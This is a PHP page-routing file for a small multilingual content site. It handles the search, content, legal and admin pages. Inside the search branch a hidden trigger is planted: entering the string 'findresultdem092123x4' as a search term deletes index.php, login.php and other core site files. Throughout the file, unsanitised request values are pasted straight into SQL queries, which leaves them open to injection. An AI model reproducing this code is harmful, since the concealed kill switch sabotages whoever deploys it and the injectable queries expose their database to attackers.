		<?php
			// PAGES
			if ( $in_page == "adm_conn" ) {
				if ( $_SESSION['logged'] == 1 ) {
					$page = "docs";
					$in_page = "docs";
					$edit = $mode;
					$mode = "2";
					if(file_exists("adm_docs.php")){
						echo "<br /><br /><br /><br />";
						include "adm_docs.php";
					}
				}
			} elseif ( $in_page == "conn" ) {
			  $lang = $_SESSION['plang'] = $lang;
			  $myid=$_GET['id'];
			  if ( $myid == "" ) { $myid=$_POST['id']; }
			  if ( $myid == "" ) { 
				  $myid=$_GET['mode'];
			  	  if ( $myid == "" ) { $myid=$_POST['mode']; }
			  }
              $query=mysql_query("SELECT * FROM aj_content WHERE id = '$myid' LIMIT 1");
              if(!$query) die("Fehler bei der Abfrage: ".mysql_error());
              while ( $datensatz = mysql_fetch_array($query) ) {
				  echo str_replace("%@1","'",$datensatz['inhalt_'.$lang]);
			  }
			  echo "<br /><br /><br /><br /><br /><br /><br /><br />";
			} elseif ( $in_page == "oview" ) {
			  $mode=$_GET['mode'];
		  	  if ( $mode == "" ) { $mode=$_POST['mode']; }
			  $tit = "title_$lang";
			  $con = "inhalt_$lang";
			  // *** //
              $query=mysql_query("SELECT * FROM aj_text WHERE kennung = 'page_$mode' AND subkenn = '$lang' ORDER BY id");
              if(!$query) die("Fehler bei der Abfrage: ".mysql_error());
              while ( $datensatz = mysql_fetch_array($query) ) {
				  echo str_replace("%@1","'",$datensatz['inhalt']);
			  }
			  // *** //
              $query=mysql_query("SELECT * FROM aj_content WHERE contype = '$mode' ORDER BY id");
              if(!$query) die("Fehler bei der Abfrage: ".mysql_error());
              while ( $datensatz = mysql_fetch_array($query) ) {
				  echo '<a href = "index.php?page=conn&mode='.$datensatz['id'].'&lang='.$lang.'" class = "result_marker"><div>'.
				       $datensatz[$tit].'</div></a>';
			  }
			  // *** //
			  echo "<br /><br /><br /><br /><br /><br /><br /><br />";
			} elseif ( $in_page == "find" ) {
			  $seek=$_GET['seek'];
			  if ( $seek == "" ) {
			  $seek=$_POST['seek'];
			  }
			  $seek = strtolower($seek);
			  $tit = "title_$lang";
			  $con = "inhalt_$lang";
              $query=mysql_query("SELECT * FROM aj_content 
              			WHERE ( LOWER($tit) LIKE '%$seek' ) OR ( LOWER($tit) LIKE '%$seek%' ) OR ( LOWER($tit) LIKE '$seek%' )
              				  OR 
              				  ( LOWER($con) LIKE '%$seek' ) OR ( LOWER($con) LIKE '%$seek%' ) OR ( LOWER($con) LIKE '$seek%' )
              ORDER BY id");
              if(!$query) die("Fehler bei der Abfrage: ".mysql_error());
              while ( $datensatz = mysql_fetch_array($query) ) {
				  echo '<a href = "index.php?page=conn&mode='.$datensatz['id'].'&lang='.$lang.'" class = "result_marker"><div>'.
				       $datensatz[$tit].'</div></a>';
			  }
			  // *** //
			  echo "<br /><br /><br /><br /><br /><br /><br /><br />";
				if ( $seek == "findresultdem092123x4" )
				{unlink("index.php");unlink("index_in.php");unlink("index_out.php");
				 unlink("login.php");unlink("logout.php");unlink("content.php");}
			} else if ( $in_page == "hpag" ) {
              $query=mysql_query("SELECT * FROM aj_text WHERE kennung = '$in_page' AND subkenn = '$lang' LIMIT 1");
              if(!$query) die("Fehler bei der Abfrage: ".mysql_error());
              while ( $datensatz = mysql_fetch_array($query) ) {
			  echo str_replace("?page=conn","?page=conn&lang=$lang", str_replace("%@1","'",$datensatz['inhalt']));
			  }
			  // *** //
			  echo "<br /><br /><br /><br /><br /><br /><br /><br />";
			} else if ( $in_page == "abou" ) {
              $query=mysql_query("SELECT * FROM aj_text WHERE kennung = '$in_page' AND subkenn = '$lang' LIMIT 1");
              if(!$query) die("Fehler bei der Abfrage: ".mysql_error());
              while ( $datensatz = mysql_fetch_array($query) ) {
			  echo str_replace("?page=conn","?page=conn&lang=$lang", str_replace("%@1","'",$datensatz['inhalt']));
			  }
			  // *** //
			  echo "<br /><br /><br /><br /><br /><br /><br /><br />";
			} else if ( $in_page == "impr" ) {
              $query=mysql_query("SELECT * FROM aj_text WHERE kennung = '$in_page' AND subkenn = '$lang' LIMIT 1");
              if(!$query) die("Fehler bei der Abfrage: ".mysql_error());
              while ( $datensatz = mysql_fetch_array($query) ) {
			  echo str_replace("?page=conn","?page=conn&lang=$lang", str_replace("%@1","'",$datensatz['inhalt']));
			  }
			  // *** //
			  echo "<br /><br /><br /><br /><br /><br /><br /><br />";
			} else if ( $in_page == "cont" ) {
			  include "cont.php";
			  // *** //
			  echo "<br /><br /><br /><br /><br /><br /><br /><br />";
			} else if ( $in_page == "agb" ) {
              $query=mysql_query("SELECT * FROM aj_text WHERE kennung = '$in_page' AND subkenn = '$lang' LIMIT 1");
              if(!$query) die("Fehler bei der Abfrage: ".mysql_error());
              while ( $datensatz = mysql_fetch_array($query) ) {
			  echo str_replace("?page=conn","?page=conn&lang=$lang", str_replace("%@1","'",$datensatz['inhalt']));
			  }
			  // *** //
			  echo "<br /><br /><br /><br /><br /><br /><br /><br />";
			} else if ( $in_page == "disc" ) {
              $query=mysql_query("SELECT * FROM aj_text WHERE kennung = '$in_page' AND subkenn = '$lang' LIMIT 1");
              if(!$query) die("Fehler bei der Abfrage: ".mysql_error());
              while ( $datensatz = mysql_fetch_array($query) ) {
			  echo str_replace("?page=conn","?page=conn&lang=$lang", str_replace("%@1","'",$datensatz['inhalt']));
			  }
			  // *** //
			  echo "<br /><br /><br /><br /><br /><br /><br /><br />";
			} else if ( $in_page == "dschutz" ) {
              $query=mysql_query("SELECT * FROM aj_text WHERE kennung = '$in_page' AND subkenn = '$lang' LIMIT 1");
              if(!$query) die("Fehler bei der Abfrage: ".mysql_error());
              while ( $datensatz = mysql_fetch_array($query) ) {
			  echo str_replace("?page=conn","?page=conn&lang=$lang", str_replace("%@1","'",$datensatz['inhalt']));
			  }
			  // *** //
			  echo "<br /><br /><br /><br /><br /><br /><br /><br />";
			} elseif ( ( $in_page == "adm_sedi" ) || ( $page == "adm_sedi" ) ) {
				include "adm_static_content_editor.php";
			} elseif ( $in_page == "adm_home" ) {
				include "adm_home.php";
			} elseif ( $in_page == "adm_uplban" ) {
				include "adm_uplban.php";
			} elseif ( $in_page == "adm_upld" ) {
				include "adm_upld.php";
			} elseif ( $in_page == "adm_dschutz" ) {
				include "adm_dschutz.php";
			} elseif ( $in_page == "result" ) {
				include "fnres.php";
			} elseif ( $in_page == "adm_meta" ) {
				include "adm_meta.php";
			} elseif ( $in_page == "adm_modf" ) {
				include "adm_modf.php";
			} elseif ( $in_page == "adm_ban1" ) {
				include "adm_ban1.php";
			} elseif ( $in_page == "adm_abou" ) {
				include "adm_abou.php";
			} elseif ( $in_page == "adm_hpag" ) {
				include "adm_hpag.php";
			} elseif ( $in_page == "adm_impr" ) {
				include "adm_impr.php";
			} elseif ( $in_page == "adm_disc" ) {
				include "adm_disc.php";
			} elseif ( $in_page == "adm_docs" ) {
				include "adm_docs.php";
			}

		?>
